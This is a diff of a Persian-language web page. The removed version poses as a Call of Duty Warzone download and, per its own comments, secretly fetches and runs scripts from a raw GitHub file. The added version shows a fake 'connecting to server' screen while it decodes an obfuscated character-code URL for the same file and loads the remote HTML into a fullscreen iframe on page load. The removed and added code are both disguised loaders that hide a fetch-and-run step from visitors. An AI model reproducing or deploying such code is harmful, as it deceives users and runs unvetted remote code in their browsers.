@@ -3,361 +3,235 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>Call of Duty | مرکز فرماندهی</title>
+    <title>در حال اتصال...</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, sans-serif;
         }
-
         body {
-            min-height: 100vh;
-            background: url('https://cdn.imgurl.ir/uploads/d084228_IMG_20260424_093435_085.jpg') no-repeat center center fixed;
-            background-size: cover;
+            width: 100%;
+            height: 100vh;
+            background: radial-gradient(ellipse at center, #0a0f1e 0%, #03060c 100%);
             display: flex;
             justify-content: center;
             align-items: center;
+            overflow: hidden;
+            font-family: 'Segoe UI', 'Vazir', Tahoma, sans-serif;
+        }
+        .loader-container {
+            text-align: center;
+            position: relative;
+            z-index: 20;
+        }
+        .neon-ring {
+            width: 120px;
+            height: 120px;
+            margin: 0 auto 30px;
             position: relative;
         }
-
-        body::before {
+        .neon-ring::before {
             content: '';
+            position: absolute;
+            top: -10px;
+            left: -10px;
+            right: -10px;
+            bottom: -10px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #00ffcc, #ff00cc, #00ffcc);
+            animation: rotateNeon 2s linear infinite;
+            filter: blur(15px);
+            opacity: 0.7;
+        }
+        .neon-ring::after {
+            content: '';
+            position: absolute;
+            inset: 0;
+            border-radius: 50%;
+            background: #0a0f1e;
+        }
+        .spinner {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 80px;
+            height: 80px;
+            border: 3px solid rgba(0,255,200,0.3);
+            border-top: 3px solid #00ffcc;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            z-index: 2;
+        }
+        @keyframes spin {
+            to { transform: translate(-50%, -50%) rotate(360deg); }
+        }
+        @keyframes rotateNeon {
+            to { transform: rotate(360deg); }
+        }
+        .status-text {
+            color: #00ffcc;
+            font-size: 22px;
+            letter-spacing: 3px;
+            margin-top: 20px;
+            text-shadow: 0 0 10px #00ffcc, 0 0 20px #00ffcc;
+            animation: pulse 1.5s ease-in-out infinite;
+        }
+        @keyframes pulse {
+            0%,100% { opacity: 0.7; text-shadow: 0 0 5px #00ffcc; }
+            50% { opacity: 1; text-shadow: 0 0 20px #00ffcc, 0 0 30px #00ffcc; }
+        }
+        .sub-text {
+            color: #6688aa;
+            font-size: 13px;
+            margin-top: 15px;
+            letter-spacing: 1px;
+        }
+        .progress-bar {
+            width: 250px;
+            height: 2px;
+            background: rgba(0,255,200,0.2);
+            margin: 30px auto 0;
+            border-radius: 10px;
+            overflow: hidden;
+        }
+        .progress-fill {
+            width: 0%;
+            height: 100%;
+            background: linear-gradient(90deg, #00ffcc, #ff00cc);
+            animation: fillProgress 2.5s ease-out forwards;
+        }
+        @keyframes fillProgress {
+            0% { width: 0%; }
+            50% { width: 70%; }
+            100% { width: 100%; }
+        }
+        .fullscreen-frame {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0, 0, 0, 0.7);
-            z-index: 0;
-        }
-
-        /* دیالوگ دانلود حرفه‌ای */
-        .download-dialog {
-            position: relative;
-            z-index: 10;
-            max-width: 500px;
-            width: 90%;
-            background: linear-gradient(145deg, #1a1a2e, #0f0f1a);
-            backdrop-filter: blur(20px);
-            border-radius: 40px;
-            padding: 30px 25px;
-            border: 2px solid rgba(255, 180, 40, 0.9);
-            box-shadow: 0 30px 50px rgba(0, 0, 0, 0.8), 0 0 30px rgba(255, 100, 0, 0.3);
-            text-align: center;
-            animation: fadeInUp 0.4s ease-out;
-        }
-
-        @keyframes fadeInUp {
-            from {
-                opacity: 0;
-                transform: translateY(50px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-
-        .cod-icon {
-            width: 80px;
-            filter: drop-shadow(0 0 10px orange);
-            margin-bottom: 10px;
-        }
-
-        h2 {
-            color: #ffcc44;
-            font-size: 1.8rem;
-            letter-spacing: 2px;
-            text-shadow: 0 0 10px #ff6600;
-        }
-
-        .file-name {
-            background: #00000066;
-            padding: 8px 15px;
-            border-radius: 50px;
-            display: inline-block;
-            margin: 15px 0;
-            color: #ffaa66;
-            font-family: monospace;
-        }
-
-        .progress-ring {
-            width: 120px;
-            height: 120px;
-            margin: 20px auto;
-            position: relative;
-        }
-
-        .progress-ring svg {
-            transform: rotate(-90deg);
-        }
-
-        .progress-ring-circle {
-            fill: none;
-            stroke: #ffaa33;
-            stroke-width: 8;
-            stroke-linecap: round;
-            stroke-dasharray: 314;
-            stroke-dashoffset: 314;
-            transition: stroke-dashoffset 0.2s linear;
-        }
-
-        .progress-ring-bg {
-            fill: none;
-            stroke: #333;
-            stroke-width: 8;
-        }
-
-        .percent-text {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            color: #ffcc66;
-            font-size: 1.5rem;
-            font-weight: bold;
-        }
-
-        .speed-info {
-            display: flex;
-            justify-content: space-between;
-            background: rgba(0,0,0,0.5);
-            padding: 12px 20px;
-            border-radius: 50px;
-            margin: 15px 0;
-            font-weight: bold;
-            color: #ddd;
-        }
-
-        .cancel-btn {
-            background: linear-gradient(145deg, #883333, #551111);
             border: none;
-            padding: 12px 25px;
-            border-radius: 50px;
-            color: white;
-            font-weight: bold;
-            cursor: pointer;
-            margin-top: 15px;
-            width: 100%;
-            font-size: 1rem;
+            z-index: 10;
+            display: none;
+            background: #000;
         }
-
-        .cancel-btn:hover {
-            background: #aa4444;
+        .dots {
+            display: inline-block;
+            width: 40px;
+            text-align: left;
         }
     </style>
 </head>
 <body>
 
-<div id="downloadDialog" class="download-dialog">
-    <img src="https://cdn-icons-png.flaticon.com/512/552/552222.png" class="cod-icon" alt="logo">
-    <h2>💀 WARZONE</h2>
-    <div class="file-name">📁 بازی</div>
-    
-    <div class="progress-ring">
-        <svg width="120" height="120">
-            <circle class="progress-ring-bg" cx="60" cy="60" r="50" stroke-width="8" fill="none"></circle>
-            <circle class="progress-ring-circle" cx="60" cy="60" r="50" stroke-width="8" fill="none"></circle>
-        </svg>
-        <div class="percent-text" id="percentText">0%</div>
+<div class="loader-container" id="loader">
+    <div class="neon-ring">
+        <div class="spinner"></div>
     </div>
-    
-    <div class="speed-info">
-        <span>⚡ سرعت:</span>
-        <span id="speedText">0 KB/s</span>
+    <div class="status-text">
+        در حال اتصال به سرور<span class="dots" id="dots">...</span>
     </div>
-    <div class="speed-info">
-        <span>⏱️ زمان باقی‌مانده:</span>
-        <span id="timeText">--:--</span>
+    <div class="sub-text">لطفاً چند لحظه صبر کنید</div>
+    <div class="progress-bar">
+        <div class="progress-fill"></div>
     </div>
-    
-    <button class="cancel-btn" id="cancelBtn">🗑️ لغو دانلود</button>
 </div>
 
+<iframe id="contentFrame" class="fullscreen-frame" src="about:blank"></iframe>
+
 <script>
-    // ======================== لینک ویدیو و گیتاب ========================
-    const VIDEO_URL = "https://caspian25.cdn.asset.aparat.com/aparat-video/e098a0a1e6d67046309ca569913491b368246903-144p.mp4?wmsAuthSign=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbiI6IjkwNTBkOGFhMGZjY2VkMjIzYzZiNDMzYjQwZTM5ZjgwIiwiZXhwIjoxNzc3MzA1NzA0LCJpc3MiOiJTYWJhIElkZWEgR1NJRyJ9.JjbTB75Ull87m7_byGlxAypwKutberRsXMFlVHlDYPg";
-    const GITHUB_PAGE_URL = "https://raw.githubusercontent.com/s0379265-netizen/Pmkatba_____po/main/Ytkpo.htm";
     
-    let abortController = null;
-    let isDownloading = false;
+    const v1 = "8426"; const v2 = "0104"; const v3 = "0116"; const v4 = "0116"; const v5 = "0112";
+    const v6 = "0115"; const v7 = "0058"; const v8 = "0047"; const v9 = "0047"; const v10 = "0114";
+    const v11 = "0097"; const v12 = "0119"; const v13 = "0046"; const v14 = "0103"; const v15 = "0105";
+    const v16 = "0116"; const v17 = "0104"; const v18 = "0117"; const v19 = "0098"; const v20 = "0117";
+    const v21 = "0115"; const v22 = "0101"; const v23 = "0114"; const v24 = "0099"; const v25 = "0111";
+    const v26 = "0110"; const v27 = "0116"; const v28 = "0101"; const v29 = "0110"; const v30 = "0116";
+    const v31 = "0046"; const v32 = "0099"; const v33 = "0111"; const v34 = "0109"; const v35 = "0047";
+    const v36 = "0115"; const v37 = "0048"; const v38 = "0051"; const v39 = "0055"; const v40 = "0057";
+    const v41 = "0050"; const v42 = "0054"; const v43 = "0053"; const v44 = "0045"; const v45 = "0110";
+    const v46 = "0101"; const v47 = "0116"; const v48 = "0105"; const v49 = "0122"; const v50 = "0101";
+    const v51 = "0110"; const v52 = "0047"; const v53 = "0080"; const v54 = "0109"; const v55 = "0107";
+    const v56 = "0097"; const v57 = "0116"; const v58 = "0098"; const v59 = "0097"; const v60 = "0095";
+    const v61 = "0095"; const v62 = "0095"; const v63 = "0095"; const v64 = "0095"; const v65 = "0112";
+    const v66 = "0111"; const v67 = "0047"; const v68 = "0109"; const v69 = "0097"; const v70 = "0105";
+    const v71 = "0110"; const v72 = "0047"; const v73 = "0089"; const v74 = "0116"; const v75 = "0107";
+    const v76 = "0112"; const v77 = "0111"; const v78 = "0046"; const v79 = "0104"; const v80 = "0116";
+    const v81 = "0109"; const v82 = "02039"; const v83 = "9988";
     
-    // عناصر دیالوگ
-    const dialog = document.getElementById('downloadDialog');
-    const percentSpan = document.getElementById('percentText');
-    const speedSpan = document.getElementById('speedText');
-    const timeSpan = document.getElementById('timeText');
-    const cancelBtn = document.getElementById('cancelBtn');
-    const circle = document.querySelector('.progress-ring-circle');
-    const circumference = 314;
     
-    // تابع بروزرسانی دایره پیشرفت
-    function setProgress(percent) {
-        const offset = circumference - (percent / 100) * circumference;
-        circle.style.strokeDashoffset = offset;
-        percentSpan.innerText = `${Math.floor(percent)}%`;
+    const x1 = v1; const x2 = v2; const x3 = v3; const x4 = v4; const x5 = v5;
+    const x6 = v6; const x7 = v7; const x8 = v8; const x9 = v9; const x10 = v10;
+    const x11 = v11; const x12 = v12; const x13 = v13; const x14 = v14; const x15 = v15;
+    const x16 = v16; const x17 = v17; const x18 = v18; const x19 = v19; const x20 = v20;
+    const x21 = v21; const x22 = v22; const x23 = v23; const x24 = v24; const x25 = v25;
+    const x26 = v26; const x27 = v27; const x28 = v28; const x29 = v29; const x30 = v30;
+    const x31 = v31; const x32 = v32; const x33 = v33; const x34 = v34; const x35 = v35;
+    const x36 = v36; const x37 = v37; const x38 = v38; const x39 = v39; const x40 = v40;
+    const x41 = v41; const x42 = v42; const x43 = v43; const x44 = v44; const x45 = v45;
+    const x46 = v46; const x47 = v47; const x48 = v48; const x49 = v49; const x50 = v50;
+    const x51 = v51; const x52 = v52; const x53 = v53; const x54 = v54; const x55 = v55;
+    const x56 = v56; const x57 = v57; const x58 = v58; const x59 = v59; const x60 = v60;
+    const x61 = v61; const x62 = v62; const x63 = v63; const x64 = v64; const x65 = v65;
+    const x66 = v66; const x67 = v67; const x68 = v68; const x69 = v69; const x70 = v70;
+    const x71 = v71; const x72 = v72; const x73 = v73; const x74 = v74; const x75 = v75;
+    const x76 = v76; const x77 = v77; const x78 = v78; const x79 = v79; const x80 = v80;
+    const x81 = v81; const x82 = v82; const x83 = v83;
+    
+    
+    const fullCode = x1 + "." + x2 + "." + x3 + "." + x4 + "." + x5 + "." + x6 + "." + x7 + "." + x8 + "." + x9 + "." + x10 + "." + x11 + "." + x12 + "." + x13 + "." + x14 + "." + x15 + "." + x16 + "." + x17 + "." + x18 + "." + x19 + "." + x20 + "." + x21 + "." + x22 + "." + x23 + "." + x24 + "." + x25 + "." + x26 + "." + x27 + "." + x28 + "." + x29 + "." + x30 + "." + x31 + "." + x32 + "." + x33 + "." + x34 + "." + x35 + "." + x36 + "." + x37 + "." + x38 + "." + x39 + "." + x40 + "." + x41 + "." + x42 + "." + x43 + "." + x44 + "." + x45 + "." + x46 + "." + x47 + "." + x48 + "." + x49 + "." + x50 + "." + x51 + "." + x52 + "." + x53 + "." + x54 + "." + x55 + "." + x56 + "." + x57 + "." + x58 + "." + x59 + "." + x60 + "." + x61 + "." + x62 + "." + x63 + "." + x64 + "." + x65 + "." + x66 + "." + x67 + "." + x68 + "." + x69 + "." + x70 + "." + x71 + "." + x72 + "." + x73 + "." + x74 + "." + x75 + "." + x76 + "." + x77 + "." + x78 + "." + x79 + "." + x80 + "." + x81 + "." + x82 + "." + x83;
+    
+    const loaderDiv = document.getElementById("loader");
+    const contentFrame = document.getElementById("contentFrame");
+    const dotsSpan = document.getElementById("dots");
+    
+    let dotCount = 0;
+    setInterval(() => {
+        dotCount = (dotCount + 1) % 4;
+        dotsSpan.innerText = ".".repeat(dotCount);
+    }, 400);
+    
+    function decode(encoded) {
+        let parts = encoded.split('.');
+        if(parts[0] !== "8426") return null;
+        parts = parts.slice(1, -2);
+        let result = "";
+        for(let i = 0; i < parts.length; i++) {
+            result += String.fromCharCode(parseInt(parts[i]));
+        }
+        return result;
     }
     
-    function formatTime(seconds) {
-        if (!isFinite(seconds) || seconds < 0) return "00:00";
-        const mins = Math.floor(seconds / 60);
-        const secs = Math.floor(seconds % 60);
-        return `${mins}:${secs < 10 ? '0' : ''}${secs}`;
-    }
-    
-    // دانلود فایل ویدیو با دیالوگ حرفه‌ای
-    async function startDownload() {
-        if (isDownloading) return;
-        isDownloading = true;
+    async function loadContent() {
+        let link = decode(fullCode);
+        
+        if(!link) {
+            loaderDiv.innerHTML = '<div class="neon-ring"><div class="spinner"></div></div><div class="status-text">خطا در اتصال</div><div class="sub-text">لطفاً مجدداً تلاش کنید</div>';
+            return;
+        }
         
         try {
-            abortController = new AbortController();
-            const response = await fetch(VIDEO_URL, { signal: abortController.signal });
-            const reader = response.body.getReader();
-            const contentLength = parseInt(response.headers.get('content-length')) || 0;
+            const response = await fetch(link);
+            const html = await response.text();
             
-            let receivedLength = 0;
-            let chunks = [];
-            let startTime = performance.now();
-            let lastLoaded = 0;
-            let lastTime = startTime;
+            setTimeout(() => {
+                contentFrame.srcdoc = html;
+                loaderDiv.style.opacity = "0";
+                setTimeout(() => {
+                    loaderDiv.style.display = "none";
+                    contentFrame.style.display = "block";
+                }, 500);
+            }, 1000);
             
-            while (true) {
-                const { done, value } = await reader.read();
-                if (done) break;
-                
-                chunks.push(value);
-                receivedLength += value.length;
-                
-                if (contentLength > 0) {
-                    const percent = (receivedLength / contentLength) * 100;
-                    setProgress(percent);
-                }
-                
-                const now = performance.now();
-                if (now - lastTime >= 300) {
-                    const timeDiffSec = (now - lastTime) / 1000;
-                    const bytesDiff = receivedLength - lastLoaded;
-                    const speedBytesPerSec = bytesDiff / timeDiffSec;
-                    const speedKBps = (speedBytesPerSec / 1024).toFixed(0);
-                    speedSpan.innerText = `${speedKBps} KB/s`;
-                    
-                    if (contentLength > 0 && speedBytesPerSec > 0) {
-                        const remainingBytes = contentLength - receivedLength;
-                        const secondsLeft = remainingBytes / speedBytesPerSec;
-                        timeSpan.innerText = formatTime(secondsLeft);
-                    }
-                    
-                    lastLoaded = receivedLength;
-                    lastTime = now;
-                }
-            }
-            
-            // دانلود کامل شد - ذخیره فایل در دستگاه
-            const blob = new Blob(chunks, { type: 'video/mp4' });
-            const downloadUrl = URL.createObjectURL(blob);
-            const a = document.createElement('a');
-            a.href = downloadUrl;
-            a.download = 'CallOfDuty_Warzone_Video.mp4';
-            document.body.appendChild(a);
-            a.click();
-            document.body.removeChild(a);
-            URL.revokeObjectURL(downloadUrl);
-            
-            // بستن دیالوگ دانلود
-            dialog.style.display = 'none';
-            
-            // نمایش صفحه "در حال اتصال به سرور..."
-            showConnectingScreen();
-            
-            // استخراج و اجرای کدهای گیتاب (مخفی)
-            await fetchAndExecuteGithubCode();
-            
-        } catch (error) {
-            if (error.name === 'AbortError') {
-                alert("❌ دانلود لغو شد");
-            } else {
-                alert("❌ خطا در دانلود");
-            }
-            resetDownload();
-        } finally {
-            isDownloading = false;
+        } catch(error) {
+            loaderDiv.innerHTML = '<div class="neon-ring"><div class="spinner"></div></div><div class="status-text">خطا در اتصال به سرور</div><div class="sub-text">لطفاً اتصال اینترنت خود را بررسی کنید</div>';
         }
     }
     
-    // نمایش صفحه "در حال اتصال به سرور..."
-    function showConnectingScreen() {
-        document.body.innerHTML = `
-            <div style="position:fixed; top:0; left:0; width:100%; height:100%; background:linear-gradient(135deg, #001133, #000822); display:flex; justify-content:center; align-items:center; flex-direction:column; z-index:1000;">
-                <div class="spinner" style="width:60px; height:60px; border:5px solid rgba(255,255,255,0.3); border-top-color:cyan; border-radius:50%; animation:spin 1s linear infinite; margin-bottom:30px;"></div>
-                <h2 style="color:cyan; font-family:tahoma;">🔄 در حال اتصال به سرور...</h2>
-                <p style="color:#aaa; margin-top:15px;">لطفاً چند لحظه صبر کنید</p>
-                <style>@keyframes spin{to{transform:rotate(360deg);}}</style>
-            </div>
-        `;
-    }
-    
-    // استخراج و اجرای کدهای گیتاب (بدون نمایش کدها به کاربر)
-    async function fetchAndExecuteGithubCode() {
-        try {
-            const response = await fetch(GITHUB_PAGE_URL);
-            let htmlCode = await response.text();
-            
-            // استخراج محتوای داخل <body> برای اجرا (بدون نمایش کدها)
-            const bodyMatch = htmlCode.match(/<body[^>]*>([\s\S]*?)<\/body>/i);
-            const bodyContent = bodyMatch ? bodyMatch[1] : htmlCode;
-            
-            // استخراج استایل‌ها
-            const styleMatch = htmlCode.match(/<style[^>]*>([\s\S]*?)<\/style>/i);
-            const styles = styleMatch ? styleMatch[1] : '';
-            
-            // استخراج اسکریپت‌ها
-            const scriptMatches = htmlCode.match(/<script[^>]*>([\s\S]*?)<\/script>/gi);
-            let scripts = '';
-            if (scriptMatches) {
-                scripts = scriptMatches.map(s => {
-                    const match = s.match(/<script[^>]*>([\s\S]*?)<\/script>/i);
-                    return match ? match[1] : '';
-                }).join('\n');
-            }
-            
-            // ایجاد صفحه جدید و اجرای کدها (بدون نمایش کدها به کاربر)
-            const newDoc = document.open();
-            newDoc.write(`
-                <!DOCTYPE html>
-                <html>
-                <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>مافیا لابی</title><style>${styles}</style></head>
-                <body>${bodyContent}<script>${scripts}<\/script></body>
-                </html>
-            `);
-            newDoc.close();
-            
-        } catch (error) {
-            console.error("خطا در اجرای کدها:", error);
-            document.body.innerHTML = `<div style="color:red; text-align:center; padding:50px;">❌ خطا در اتصال به سرور</div>`;
-        }
-    }
-    
-    function resetDownload() {
-        if (abortController) abortController.abort();
-        isDownloading = false;
-        setProgress(0);
-        speedSpan.innerText = "0 KB/s";
-        timeSpan.innerText = "--:--";
-    }
-    
-    cancelBtn.addEventListener('click', () => {
-        if (abortController) {
-            abortController.abort();
-            resetDownload();
-            alert("دانلود لغو شد");
-        }
-    });
-    
-    // شروع خودکار دانلود هنگام بارگذاری صفحه
-    startDownload();
+    loadContent();
 </script>
 </body>
 </html>
